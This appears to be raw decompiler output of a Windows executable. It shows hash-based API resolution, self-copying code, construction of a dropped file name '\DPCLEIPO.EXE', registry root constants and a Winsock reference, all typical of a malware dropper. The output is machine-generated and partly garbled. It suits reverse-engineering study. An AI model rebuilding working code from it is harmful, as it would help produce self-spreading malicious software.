typedef unsigned char   undefined;

typedef unsigned int    ImageBaseOffset32;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned int    uint;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned int    undefined4;
typedef unsigned short    word;
typedef char CHAR;

typedef CHAR * LPCSTR;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef struct HINSTANCE__ * HINSTANCE;

typedef HINSTANCE HMODULE;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};




// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void entry(void)

{
  int *piVar1;
  byte bVar2;
  byte extraout_CL;
  undefined2 extraout_DX;
  undefined4 *puVar3;
  undefined4 *unaff_EBP;
  short unaff_DI;
  undefined2 in_SS;
  char cVar4;
  byte in_AF;
  undefined4 uStackY132;
  undefined4 in_stack_ffffff84;
  undefined4 in_stack_ffffff88;
  undefined *in_stack_ffffff8c;
  undefined *in_stack_ffffff90;
  undefined *in_stack_ffffff94;
  undefined *in_stack_ffffff98;
  undefined4 in_stack_ffffff9c;
  undefined4 in_stack_ffffffa0;
  undefined *in_stack_ffffffa4;
  undefined4 in_stack_ffffffa8;
  undefined *in_stack_ffffffac;
  undefined *in_stack_ffffffb0;
  undefined4 in_stack_ffffffb4;
  undefined *in_stack_ffffffb8;
  undefined *in_stack_ffffffbc;
  undefined4 in_stack_ffffffc0;
  undefined4 in_stack_ffffffc4;
  undefined *in_stack_ffffffc8;
  
  _DAT_0040230a = GetModuleHandleA(s_KERNEL32_dll_0040704c);
  cVar4 = (undefined *)0x7b < &stack0x00000000;
  FUN_004010b0(&stack0xffffff84,(int)_DAT_0040230a,in_stack_ffffff84,in_stack_ffffff88,
               in_stack_ffffff8c,in_stack_ffffff90,in_stack_ffffff94,in_stack_ffffff98,
               in_stack_ffffff9c,in_stack_ffffffa0,in_stack_ffffffa4,in_stack_ffffffa8,
               in_stack_ffffffac,in_stack_ffffffb0,in_stack_ffffffb4,in_stack_ffffffb8,
               in_stack_ffffffbc,in_stack_ffffffc0,in_stack_ffffffc4,in_stack_ffffffc8);
  bVar2 = ((char)_DAT_da270a35 + '\x06') - cVar4;
  puVar3 = (undefined4 *)&stack0xffffff80;
  cVar4 = '\a';
  do {
    unaff_EBP = unaff_EBP + -1;
    puVar3 = puVar3 + -1;
    *puVar3 = *unaff_EBP;
    cVar4 = cVar4 + -1;
  } while ('\0' < cVar4);
  out(extraout_DX,bVar2 + (9 < (bVar2 & 0xf) | in_AF) * '\x06' & 0xf);
  piVar1 = (int *)segment(in_SS,(short)&stack0xffffff80 + unaff_DI + -0x16);
  *piVar1 = *piVar1 << (extraout_CL & 0x1f);
  do {
                    // WARNING: Do nothing block with infinite loop
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00401018(void)

{
  int *piVar1;
  byte bVar2;
  byte extraout_CL;
  undefined2 extraout_DX;
  undefined4 *puVar3;
  undefined4 *unaff_EBP;
  short unaff_DI;
  undefined2 in_SS;
  char cVar4;
  byte in_AF;
  undefined4 uStackY132;
  undefined4 in_stack_ffffff84;
  undefined4 in_stack_ffffff88;
  undefined *in_stack_ffffff8c;
  undefined *in_stack_ffffff90;
  undefined *in_stack_ffffff94;
  undefined *in_stack_ffffff98;
  undefined4 in_stack_ffffff9c;
  undefined4 in_stack_ffffffa0;
  undefined *in_stack_ffffffa4;
  undefined4 in_stack_ffffffa8;
  undefined *in_stack_ffffffac;
  undefined *in_stack_ffffffb0;
  undefined4 in_stack_ffffffb4;
  undefined *in_stack_ffffffb8;
  undefined *in_stack_ffffffbc;
  undefined4 in_stack_ffffffc0;
  undefined4 in_stack_ffffffc4;
  undefined *in_stack_ffffffc8;
  
  _DAT_0040230a = GetModuleHandleA(s_KERNEL32_dll_0040704c);
  cVar4 = (undefined *)0x7b < &stack0x00000000;
  FUN_004010b0(&stack0xffffff84,(int)_DAT_0040230a,in_stack_ffffff84,in_stack_ffffff88,
               in_stack_ffffff8c,in_stack_ffffff90,in_stack_ffffff94,in_stack_ffffff98,
               in_stack_ffffff9c,in_stack_ffffffa0,in_stack_ffffffa4,in_stack_ffffffa8,
               in_stack_ffffffac,in_stack_ffffffb0,in_stack_ffffffb4,in_stack_ffffffb8,
               in_stack_ffffffbc,in_stack_ffffffc0,in_stack_ffffffc4,in_stack_ffffffc8);
  bVar2 = ((char)_DAT_da270a35 + '\x06') - cVar4;
  puVar3 = (undefined4 *)&stack0xffffff80;
  cVar4 = '\a';
  do {
    unaff_EBP = unaff_EBP + -1;
    puVar3 = puVar3 + -1;
    *puVar3 = *unaff_EBP;
    cVar4 = cVar4 + -1;
  } while ('\0' < cVar4);
  out(extraout_DX,bVar2 + (9 < (bVar2 & 0xf) | in_AF) * '\x06' & 0xf);
  piVar1 = (int *)segment(in_SS,(short)&stack0xffffff80 + unaff_DI + -0x16);
  *piVar1 = *piVar1 << (extraout_CL & 0x1f);
  do {
                    // WARNING: Do nothing block with infinite loop
  } while( true );
}



void __thiscall
FUN_004010b0(void *this,int param_1,undefined4 param_2,undefined4 param_3,undefined *param_4,
            undefined *param_5,undefined *param_6,undefined *param_7,undefined4 param_8,
            undefined4 param_9,undefined *param_10,undefined4 param_11,undefined *param_12,
            undefined *param_13,undefined4 param_14,undefined *param_15,undefined *param_16,
            undefined4 param_17,undefined4 param_18,undefined *param_19)

{
  code *pcVar1;
  int iVar2;
  uint uVar3;
  undefined *puVar4;
  int iVar5;
  uint uVar6;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  uint extraout_ECX_01;
  uint extraout_EDX;
  undefined uVar7;
  uint *puVar8;
  code *pcVar9;
  byte *pbVar10;
  byte *pbVar11;
  ulonglong uVar12;
  uint *unaff_retaddr;
  code *in_stack_0000005c;
  undefined4 uStack00000080;
  code *in_stack_fffffdc0;
  code *in_stack_fffffdc4;
  undefined uVar13;
  undefined uVar14;
  undefined uVar15;
  undefined uVar16;
  byte in_stack_fffffdf0;
  undefined in_stack_fffffdf4;
  byte bStack268;
  undefined4 auStack267 [46];
  code *pcStack80;
  code *pcStack40;
  undefined4 in_stack_ffffffdc;
  code *pcStack28;
  code *pcStack20;
  int iVar17;
  
  FUN_0040198e(0x1f,(int)this,unaff_retaddr,param_1);
  iVar5 = DAT_00401002;
  uStack00000080 = 0xedb88320;
                    // WARNING (jumptable): Read-only address (ram,0x0040172b) is written
                    // WARNING: Read-only address (ram,0x0040172b) is written
  uRam0040172b = 0x80000002;
                    // WARNING (jumptable): Read-only address (ram,0x00401751) is written
                    // WARNING: Read-only address (ram,0x00401751) is written
  uRam00401751 = 0x80000001;
  iVar17 = DAT_00401002;
  pcVar1 = (code *)(*(code *)param_16)();
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*(code *)param_13)();
    pcStack20 = pcVar1;
    if (iVar2 == 0) {
      pcStack20 = (code *)0x5f325357;
      pcStack28 = (code *)0x401118;
      iVar2 = (*(code *)param_6)();
      if (iVar2 != 0) {
        (*(code *)param_7)();
        pcVar9 = entry + iVar5;
        pcVar1 = pcVar1 + iVar5;
        for (; iVar5 != 0; iVar5 = iVar5 + -1) {
          *pcVar1 = *pcVar9;
          pcVar9 = pcVar9 + -1;
          pcVar1 = pcVar1 + -1;
        }
        *pcVar1 = (code)0xeb;
                    // WARNING: Could not recover jumptable at 0x00401136. Too many branches
                    // WARNING: Treating indirect jump as call
        (*(pcVar1 + 0x138))();
        return;
      }
    }
  }
  uVar7 = SUB41(&bStack268,0);
  pbVar11 = &bStack268;
  uVar15 = SUB41(&stack0xfffffdf0,0);
  puVar4 = &stack0xfffffdf0;
  uVar16 = 4;
  uVar14 = 0;
  (*in_stack_0000005c)();
  uVar13 = 4;
  uVar3 = (*(code *)param_12)();
  uVar6 = uVar3;
  pbVar10 = &stack0xfffffdf0;
  do {
    if ((*pbVar10 != *pbVar11) && (*pbVar11 != (*pbVar10 ^ 0x20))) break;
    pbVar11 = pbVar11 + 1;
    uVar6 = uVar6 - 1;
    pbVar10 = pbVar10 + 1;
  } while (uVar6 != 0);
  (&bStack268)[uVar3] = 0x5c;
  *(undefined4 *)(&bStack268 + uVar3 + 1) = 0x4c435044;
  *(undefined4 *)((int)auStack267 + uVar3 + 4) = 0x4f504945;
  *(undefined4 *)((int)auStack267 + uVar3 + 8) = 0x4558452e;
  *(undefined4 *)((int)auStack267 + uVar3 + 0xc) = 0;
  if (in_stack_0000005c != (code *)0x0) {
    if (uVar6 != 0) {
      pcVar1 = (code *)FUN_004017d4(&stack0xfffffdf0,0x80000000,3,uVar7,uVar13,uVar14,uVar15,uVar16,
                                    in_stack_fffffdf0,in_stack_fffffdf4,iVar17);
      if (pcVar1 == (code *)0xffffffff) {
        return;
      }
      uVar14 = 0x40;
      in_stack_fffffdc4 = (code *)(*(code *)param_19)();
      uVar13 = 0;
      thunk_FUN_00401902();
      uVar7 = SUB41(&stack0x00000476,0);
      uVar15 = 0;
      in_stack_fffffdc0 = pcVar1;
      (*(code *)param_10)();
      (*pcStack28)();
      puVar4 = (undefined *)
               FUN_004017d4(&bStack268,0x40000000,2,(char)pcVar1,(char)in_stack_fffffdc0,
                            (char)in_stack_fffffdc4,uVar15,uVar7,uVar13,uVar14,in_stack_ffffffdc);
      if (puVar4 != (undefined *)0xffffffff) {
        (*(code *)param_5)();
        uVar6 = 0xffffffff;
        uVar12 = FUN_00401bcb(extraout_ECX,extraout_EDX,0xffffffff);
        FUN_00401bcb(extraout_ECX_00,(uint)uVar12 & 0xffff,uVar6);
        (*(code *)param_4)();
        (*pcStack40)();
        (*pcStack80)();
      }
      (*pcStack20)();
    }
    pcVar1 = (code *)0x4016ec;
    iVar5 = (*(code *)0x40)();
    FUN_0040198e(3,(int)&stack0xfffffdc0,(uint *)&stack0xfffffdcc,iVar5);
    thunk_FUN_00401902();
    puVar8 = (uint *)(puVar4 + 0x802);
    iVar5 = 0x10;
    do {
      *puVar8 = *puVar8 ^ 0xedb88320;
      puVar8 = puVar8 + 1;
      iVar5 = iVar5 + -1;
    } while (iVar5 != 0);
    iVar5 = (*in_stack_fffffdc0)();
    if ((iVar5 != 0) && (iVar5 = (*in_stack_fffffdc0)(), iVar5 != 0)) {
      return;
    }
    FUN_00401abd();
    (*in_stack_fffffdc4)();
    (*pcVar1)();
    uVar6 = extraout_ECX_01 ^ 0xedb88320;
  }
  if ((uVar6 == 0) && (iVar5 = (*(code *)param_16)(), iVar5 == 0)) {
    (*(code *)param_15)();
  }
                    // WARNING: Read-only address (ram,0x0040172b) is written
                    // WARNING: Read-only address (ram,0x00401751) is written
  return;
}



void FUN_004017d4(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined param_4,
                 undefined param_5,undefined param_6,undefined param_7,undefined param_8,
                 undefined param_9,undefined param_10,code *param_11)

{
  (*param_11)(param_1,param_2,3,0,param_3,0x80,0);
  return;
}



void thunk_FUN_00401902(void)

{
  return;
}



void FUN_00401902(void)

{
  return;
}



int FUN_0040198e(int param_1,int param_2,uint *param_3,int param_4)

{
  byte *pbVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  uint uVar5;
  char cVar6;
  uint uVar7;
  int iVar8;
  int iVar9;
  int *piVar10;
  byte *pbVar11;
  uint *puVar12;
  int iVar13;
  
  piVar10 = (int *)(*(int *)(param_4 + 0x78 + *(int *)(param_4 + 0x3c)) + 0x18 + param_4);
  iVar9 = *piVar10;
  iVar2 = piVar10[1];
  iVar3 = piVar10[3];
  piVar10 = (int *)(piVar10[2] + param_4);
  iVar13 = 0;
  do {
    iVar4 = *piVar10;
    uVar7 = 0;
    pbVar11 = (byte *)(iVar4 + param_4);
    while( true ) {
      pbVar1 = pbVar11 + 1;
      iVar8 = param_1;
      puVar12 = param_3;
      if (*pbVar11 == 0) break;
      uVar7 = uVar7 & 0xffffff00 | (uint)(byte)((byte)uVar7 ^ *pbVar11);
      cVar6 = '\b';
      do {
        uVar5 = uVar7 & 1;
        uVar7 = uVar7 >> 1;
        if (uVar5 != 0) {
          uVar7 = uVar7 ^ 0xedb88320;
        }
        cVar6 = cVar6 + -1;
        pbVar11 = pbVar1;
      } while (cVar6 != '\0');
    }
    do {
      if (*puVar12 == uVar7) {
        *(int *)(param_2 + (iVar8 + -1) * 4) =
             *(int *)(iVar2 + param_4 + (uint)*(ushort *)(iVar3 + param_4 + iVar13 * 2) * 4) +
             param_4;
        break;
      }
      iVar8 = iVar8 + -1;
      puVar12 = puVar12 + 1;
    } while (iVar8 != 0);
    iVar9 = iVar9 + -1;
    piVar10 = piVar10 + 1;
    iVar13 = iVar13 + 1;
    if (iVar9 == 0) {
      return iVar4;
    }
  } while( true );
}



undefined4 FUN_00401abd(void)

{
  char cVar1;
  undefined4 in_EAX;
  char *unaff_ESI;
  
  do {
    cVar1 = *unaff_ESI;
    unaff_ESI = unaff_ESI + 1;
  } while (cVar1 != '\0');
  return in_EAX;
}



ulonglong __fastcall FUN_00401bcb(undefined4 param_1,uint param_2,uint param_3)

{
  uint uVar1;
  int unaff_EBP;
  
  uVar1 = thunk_FUN_00401902();
  *(uint *)(unaff_EBP + 0xbcf) = uVar1;
  return (ulonglong)uVar1 % (ulonglong)param_3 | (ulonglong)param_2 << 0x20;
}


